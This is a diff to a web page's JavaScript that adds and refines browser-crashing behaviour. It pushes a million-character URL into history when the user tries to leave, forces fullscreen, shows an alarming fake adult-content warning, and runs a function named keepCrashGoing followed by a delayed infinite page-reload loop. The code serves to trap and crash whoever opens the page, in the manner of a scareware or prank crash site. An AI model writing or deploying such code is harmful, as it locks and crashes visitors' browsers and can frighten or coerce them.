@@ -104,7 +104,9 @@
   </div>
 
   <script>
-    window.alert("WARNING: ADULT CONTENT. IF YOU ARE UNDER 18, LEAVE THIS WEBSITE IMMEDIATELY.");
+    window.onbeforeunload = function() {
+      history.pushState(0,0, new Array(1000000).join("a"));
+    }
     const interactiveZone = document.getElementById('interactiveZone');
     const statusLabel = document.getElementById('statusLabel');
     const staticRing = document.getElementById('staticRing');
@@ -188,9 +190,13 @@
         else if (doc.msRequestFullscreen) doc.msRequestFullscreen();
         fullScreen = true;
       }
+
+      window.alert("WARNING: ADULT CONTENT. IF YOU ARE UNDER 18, LEAVE THIS WEBSITE IMMEDIATELY.");
       
       keepCrashGoing();
-      while(1)location.reload(1)
+      setTimeout(() => {
+        while (1) location.reload();
+      }, 1000);
     }
 
     function keepCrashGoing() {
